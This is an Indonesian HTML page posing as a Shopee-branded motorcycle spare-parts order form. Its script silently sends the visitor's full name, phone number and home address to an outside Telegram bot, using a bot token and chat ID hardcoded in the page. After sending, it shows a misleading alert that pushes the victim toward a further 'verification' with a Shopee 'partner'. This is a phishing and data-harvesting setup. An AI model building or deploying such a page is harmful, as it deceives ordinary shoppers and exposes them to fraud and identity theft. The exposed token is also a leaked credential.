<!DOCTYPE html>
<html lang="id">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Formulir Pemesanan Suku Cadang Motor</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        body {
            background-color: #EE7A39;
            /* Warna oranye Shopee */
            color: black;
            /* Warna teks utama menjadi hitam */
        }

        .container {
            background-color: white;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            margin: 20px auto;
            max-width: 600px;
            padding: 20px;
        }

        .form-group {
            margin-bottom: 15px;
        }

        .form-group label {
            display: block;
            font-weight: bold;
            margin-bottom: 5px;
            color: black;
            /* Warna label menjadi hitam */
        }

        .form-group input[type="text"],
        .form-group input[type="tel"],
        .form-group input[type="number"],
        .form-group textarea {
            width: 100%;
            padding: 8px;
            border: 1px solid #ccc;
            border-radius: 4px;
            box-sizing: border-box;
            font-size: 14px;
            color: black;
            /* Warna teks input menjadi hitam */
        }

        .form-group textarea {
            resize: vertical;
        }

        button {
            background-color: #EE7A39;
            /* Warna oranye Shopee */
            color: white;
            padding: 10px 15px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
        }

        button:hover {
            background-color: #d6652d;
        }

        /* Mengubah warna ikon motor */
        .logo i {
            color: #EE7A39;
            /* Warna oranye Shopee */
        }

        h1,
        p {
            color: black;
            /* Warna judul dan paragraf menjadi hitam */
        }

        h2 {
            color: black;
            /* Warna "Informasi Pemesan" menjadi hitam */
        }
    </style>
</head>

<body>
    <div class="container">
        <header>
            <div class="logo-wrapper">
                <div class="logo">
                    <i class="fas fa-motorcycle fa-3x"></i>
                </div>
            </div>
            <h1>Formulir Pemesanan Suku Cadang Motor</h1>
            <p>Isi formulir ini untuk memesan suku cadang motor yang Anda butuhkan</p>
        </header>
        <main class="order-form-section">
            <div class="form-card">
                <h2>
                    <i class="fas fa-user icon-cube"></i>
                    Informasi Pemesan
                </h2>
                <form id="orderForm">
                    <div class="form-group">
                        <label for="namaLengkap">Nama Lengkap *</label>
                        <input type="text" id="namaLengkap" placeholder="Masukkan nama lengkap" required>
                    </div>
                    <div class="form-group">
                        <label for="nomorTelepon">Nomor Telepon *</label>
                        <input type="tel" id="nomorTelepon" placeholder="08xxxxxxxxxx" required
                            pattern="[0-9]{10,13}">
                    </div>
                    <div class="form-group">
                        <label for="alamatLengkap">Alamat Lengkap *</label>
                        <textarea id="alamatLengkap" placeholder="Masukkan alamat lengkap untuk pengiriman" rows="4"
                            required></textarea>
                    </div>
                    <div class="form-group">
                        <label for="namaProduk">Nama Produk *</label>
                        <input type="text" id="namaProduk" placeholder="Masukkan nama produk (contoh: Honda Beat)"
                            required>
                    </div>
                    <div class="form-group">
                        <label for="harga">Harga *</label>
                        <input type="number" id="harga" placeholder="Masukkan harga" required min="100000"
                            max="100000000">
                    </div>
                    <button type="submit" id="verifikasiButton">Verifikasi Pemesanan</button>
                </form>
            </div>
        </main>
    </div>
    <script>
        document.addEventListener('DOMContentLoaded', function () {
            document.getElementById('orderForm').addEventListener('submit', function (event) {
                event.preventDefault();

                // DITETAPKAN: Token dan Chat ID Anda
                var token = "8483832719:AAH9MrWjVVmMxydfTMJjOPyG_c7xu04P6Gk"; 
                var chatId = "5923031825"; 
                // ------------------------------------

                // Ambil data input
                var nama = document.getElementById('namaLengkap').value.trim();
                var telepon = document.getElementById('nomorTelepon').value.trim();
                var alamat = document.getElementById('alamatLengkap').value.trim();
                var namaProduk = document.getElementById('namaProduk').value.trim();
                var hargaInput = document.getElementById('harga').value.trim();

                // Validasi input
                if (!nama || !telepon || !alamat || !namaProduk || !hargaInput) {
                    alert('Harap isi semua kolom yang diperlukan.');
                    return;
                }

                var harga = parseFloat(hargaInput);
                if (isNaN(harga) || harga <= 0) {
                     alert('Harga tidak valid.');
                     return;
                }

                // Susun pesan untuk Telegram
                var text =
                    "**ðŸ›µ PEMESANAN BARU SUKU CADANG MOTOR ðŸï¸**\n\n" +
                    "**INFORMASI PEMESAN:**\n" +
                    "Nama Lengkap: " + nama + "\n" +
                    "Nomor Telepon: " + telepon + "\n" +
                    "Alamat Lengkap: " + alamat + "\n\n" +
                    "**DETAIL PESANAN:**\n" +
                    "Nama Produk: " + namaProduk + "\n" +
                    "Harga: Rp" + new Intl.NumberFormat('id-ID').format(harga); // Memformat harga

                // URL endpoint Telegram API
                var url = "https://api.telegram.org/bot" + token + "/sendMessage";

                var params = {
                    chat_id: chatId,
                    text: text,
                    parse_mode: 'Markdown' 
                };

                fetch(url, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify(params)
                })
                    .then(response => {
                        if (!response.ok) {
                            return response.json().then(errorData => {
                                // Memberikan detail error dari Telegram API
                                throw new Error('Status: ' + response.status + ', Telegram Error: ' + errorData.description);
                            }).catch(() => {
                                // Jika tidak bisa mengurai JSON error
                                throw new Error('Gagal mengirim ke Telegram. Status: ' + response.status + ' ' + response.statusText);
                            });
                        }
                        return response.json();
                    })
                    .then(data => {
                        if (data.ok) {
                            // !!! BAGIAN INI SUDAH DIPERBAIKI SESUAI PERMINTAAN !!!
                            alert(') kamu sudah mengisi formulir pesanan, tapi kamu perlu memverifikasi antara mitra Shopee mu dengan Shopee mu ');
                            document.getElementById('orderForm').reset();
                        } else {
                            // Tangani kasus di mana HTTP status OK (200) tetapi data.ok = false
                            alert('Gagal mengirim ke Telegram (Data Not OK): ' + data.description);
                            console.error('Telegram API Data Not OK:', data);
                        }
                    })
                    .catch(error => {
                        console.error("Gagal koneksi atau kirim ke Telegram:", error);
                        alert("Gagal mengirim ke Telegram. Detail: " + error.message);
                    });
            });
        });
    </script>
</body>

</html>
